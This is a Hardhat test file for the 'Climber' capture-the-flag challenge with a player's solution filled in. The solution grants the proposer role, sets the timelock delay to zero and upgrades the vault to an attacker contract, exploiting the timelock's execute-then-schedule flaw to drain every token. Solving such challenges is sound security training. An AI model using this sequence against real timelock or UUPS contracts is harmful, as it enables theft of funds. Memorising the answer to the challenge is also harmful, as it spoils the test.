const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, player;
    let timelock, vault, token;

    const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TIMELOCK_DELAY = 60 * 60;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await vault.getSweeper()).to.eq(sweeper.address);
        expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
        expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await vault.owner();
        timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock delay is correct and cannot be changed
        expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
        await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, 'CallerNotTimelock');
        
        // Ensure timelock roles are correctly initialized
        expect(
            await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
        ).to.be.true;
        expect(
            await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const VaultHackFactory = await ethers.getContractFactory('VaultHack', player);
        const vaultHack = await VaultHackFactory.deploy();
        console.log('vaultHack', vaultHack.address);

        const ClimberHackFactory = await ethers.getContractFactory('ClimberHack', player);
        const climberHack = await ClimberHackFactory.deploy(player.address, timelock.address, token.address, vault.address);
        console.log('climberHack', climberHack.address);

        // Execute a transaction to schedule
        
        // Make this contract a proposer
        const proposerEncodedData = timelock.interface.encodeFunctionData('grantRole', [ethers.utils.id("PROPOSER_ROLE"), climberHack.address]);
        // Update the delay to 0
        const updateDelayEncodedData = timelock.interface.encodeFunctionData('updateDelay', [0]);
        // Update the vault logic contract to VaultHack contract
        const updateVaultLogicEncodedData = vault.interface.encodeFunctionData('upgradeTo', [vaultHack.address]);
        // Call the exploit function
        const exploitEncodedData = climberHack.interface.encodeFunctionData('exploit');

        const targets = [timelock.address, timelock.address, vault.address, climberHack.address];
        const values = Array(targets.length).fill(0);
        const dataElements = [proposerEncodedData, updateDelayEncodedData, updateVaultLogicEncodedData, exploitEncodedData];
        // Make salt a zero bytes32 field
        const salt = ethers.utils.hexZeroPad(ethers.utils.hexlify(0), 32);
        console.log("All the encoded data got till this point")

        // const txn = await climberHack.exploit(targets, values, dataElements, salt);
        await climberHack.saveScheduledData(targets, dataElements);

        await timelock.connect(player).execute(targets, values, dataElements, salt);

        await climberHack.withdraw();

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
